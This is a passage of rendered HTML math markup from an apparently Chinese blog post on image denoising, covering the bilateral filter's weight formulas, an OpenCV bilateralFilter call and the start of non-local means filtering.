stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>K</mi></mfrac><munder><mo>∑</mo><mi>N</mi></munder><mrow><mi>W</mi><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">)</mo><mo separator="true">⋅</mo><mi>I</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">O(s_0)=\frac{1}{K}\sum_N{W(s,s_0)·I(s)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.615776em;vertical-align:-1.294336em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.13889em;">W</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mpunct">⋅</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mclose">)</span></span></span></span></span></span></p><h4 id="高斯双边模糊"><a class="markdownIt-Anchor" href="#高斯双边模糊"></a> 高斯双边模糊</h4><ul><li>权重有高斯核函数生成，组成为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mo>=</mo><msub><mi>w</mi><mi>s</mi></msub><mo>+</mo><msub><mi>w</mi><mi>c</mi></msub></mrow><annotation encoding="application/x-tex">w=w_s+w_c</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>p</mi><mi>a</mi><mi>t</mi><mi>i</mi><mi>a</mi><mi>l</mi><mi>s</mi><mi>p</mi><mi>a</mi><mi>c</mi><mi>e</mi><mo>:</mo><msub><mi>w</mi><mi>s</mi></msub><mo>=</mo><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><mfrac><mrow><mo>−</mo><mo stretchy="false">(</mo><mi>s</mi><mo>−</mo><msub><mi>s</mi><mn>0</mn></msub><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msubsup><mi>δ</mi><mi>s</mi><mn>2</mn></msubsup></mrow></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">spatial space: w_s=\exp(\frac{-(s-s_0)^2}{2\delta_s^2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">i</span><span class="mord mathdefault">a</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">s</span><span class="mord mathdefault">p</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4241080000000004em;vertical-align:-0.933em;"></span><span class="mop">exp</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.4530000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">s</span></span></span><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.933em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>o</mi><mi>l</mi><mi>o</mi><mi>r</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>g</mi><mi>e</mi><mo>:</mo><msub><mi>w</mi><mi>c</mi></msub><mo>=</mo><mi>exp</mi><mo>⁡</mo><mo stretchy="false">(</mo><mfrac><mrow><mo>−</mo><mo stretchy="false">(</mo><mi>I</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mo>−</mo><mi>I</mi><mo stretchy="false">(</mo><msub><mi>s</mi><mn>0</mn></msub><mo stretchy="false">)</mo><msup><mo stretchy="false">)</mo><mn>2</mn></msup></mrow><mrow><mn>2</mn><msubsup><mi>δ</mi><mi>c</mi><mn>2</mn></msubsup></mrow></mfrac><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">color range: w_c=\exp(\frac{-(I(s)-I(s_0))^2}{2\delta_c^2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4241080000000004em;vertical-align:-0.933em;"></span><span class="mop">exp</span><span class="mopen">(</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.491108em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03785em;">δ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.4530000000000003em;margin-left:-0.03785em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">c</span></span></span><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathdefault">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.933em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mclose">)</span></span></span></span></span></p><ul><li>代码事项</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// src,dst,原来的尺寸上还是扩大还是缩小，颜色值空间，高斯核大小</span></span><br><span class="line">bilateralFilter(src,dst,<span class="number">0</span>,<span class="number">100</span>,<span class="number">10</span>);</span><br></pre></td></tr></table></figure><ul><li>高斯双边模糊，可以很好的去除图像中的噪声，经常用作于照片的磨皮。</li></ul><h4 id="非局部均值滤波"><a class="markdownIt-Anchor" href="#非局部均值滤波"></a> 非局部均值滤波</h4><ul><li>相似像素块，权重比较大，不相似的权重比较小。搜索窗口为<code>l*l</code>的，i是<code>3*3</code>像素的模板，在窗口中进行均值计算。越相似权重越大，越不想死权重越小。最后将权重归一化。</li><li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>w</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><mo stretchy="false">)</mo></mrow></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow></msub><mo separator="true">,</mo><msub><mi>w</mi><mrow><mo stretchy="false">(</mo><mi>p</mi><mo separator="true">,</mo><msub><mi>q</mi><mn>3</mn></msub><mo stretchy="false">)</mo></mrow></msub></mrow><annotation encoding="application/x-tex">w_{(p,q_1)},w_{(p,q_2)},w_{(p,q_3)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7857599999999999em;vertical-align:-0.3551999999999999em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:-0.02691em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathdefault mtight">p</span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:-0.03588em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mclose mtight">)</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span></span></span></span></li></ul><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>x</mi><mrow><mi>N</mi><mi>L</mi><mi>M</mi></mrow></msub><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><munder><mo>∑</mo><mrow><mi>j</mi><mo>∈</mo><msub><mi>W</mi><mi>i</mi></msub></mrow></munder><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></mrow></mfrac><munder><mo>∑</mo><mrow><mi>j</mi><mo>∈</mo><msub><mi>W</mi><mi>i</mi></msub></mrow></munder><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mi>x</mi><mo stretchy="false">(</mo><mi>j</mi><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">x_{NLM}(i)=\frac{1}{\sum_{j\in W_i}{w(i,j)}}\sum_{j\in W_i}{w(i,j)x(j)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.10903em;">N</span><span class="mord mathdefault mtight">L</span><span class="mord mathdefault mtight" style="margin-right:0.10903em;">M</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.751884em;vertical-align:-1.430444em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.17862099999999992em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.1218180000000002em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.05724em;">j</span><span class="mrel mtight">∈</span><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3280857142857143em;"><span style="top:-2.357em;margin-left:-0.13889em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathdefault mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mord mathdefault">x</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span></span></span></span></span></span></p><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>w</mi><mo stretchy="false">(</mo><mi>i</mi><mo separator="true">,</mo><mi>j</mi><mo stretchy="false">)</mo><mo>=</mo><mi>e</mi><mi>x</mi><mi>p</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><munder><mo>∑</mo><mi>k</mi></munder><mfrac><mrow><mo stretchy="false">[</mo><mi>x</mi><mo stretchy="false">(</mo><msubsup><mi>l</mi><mi>j</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo><mo>−</mo><mi>x</mi><mo stretchy="false">(</mo><msubsup><mi>l</mi><mi>i</mi><mi>k</mi></msubsup><mo stretchy="false">)</mo><msup><mo stretchy="false">]</mo><mn>2</mn></msup></mrow><msup><mi>h</mi><mn>2</mn></msup></mfrac><mo stretchy="false">)</mo></mrow></mrow><annotation encoding="application/x-tex">w(i,j)=exp{(-\sum_{k}{\frac{[x(l^k_j)-x(l^k_i)]^2}{h^2}})}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mopen">(</span><span class="mord mathdefault">i</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.935993em;vertical-align:-1.3021129999999999em;"></span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">p</span><span class="mord"><span class="mopen">(</span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000005em;"><span style="top:-1.847887em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.3021129999999999em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.63388em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.740108em;"><span style="top:-2.9890000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span 